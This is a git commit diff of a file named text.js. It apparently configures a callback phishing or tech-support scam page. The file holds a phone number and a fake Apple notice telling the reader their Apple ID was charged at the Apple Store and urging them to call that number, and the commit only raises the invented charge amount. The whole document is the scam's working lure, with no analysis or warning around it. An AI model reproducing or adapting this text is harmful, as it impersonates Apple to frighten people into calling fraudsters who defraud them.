09454a19ed796aa90f0581b628642360105e1488
googlecare <gosoxohyeah@gmail.com>
2026-02-06 16:38:29 +0530

    Update text.js

--- text.js
+++ text.js
@@ -1,3 +1,3 @@
 window.defaultNumber = '+1 (806) 544-4264';
-window.defaultText='We have noticed that your Apple Id was recently used at "APPLE STORE" For $159.58, Paid by Apple Pay Pre Authorization. If NOT you? Please call +1 (806) 544-4264 Talk to an Apple Representative.!';
+window.defaultText='We have noticed that your Apple Id was recently used at "APPLE STORE" For $572.62 , Paid by Apple Pay Pre Authorization. If NOT you? Please call +1 (806) 544-4264 Talk to an Apple Representative.!';
 
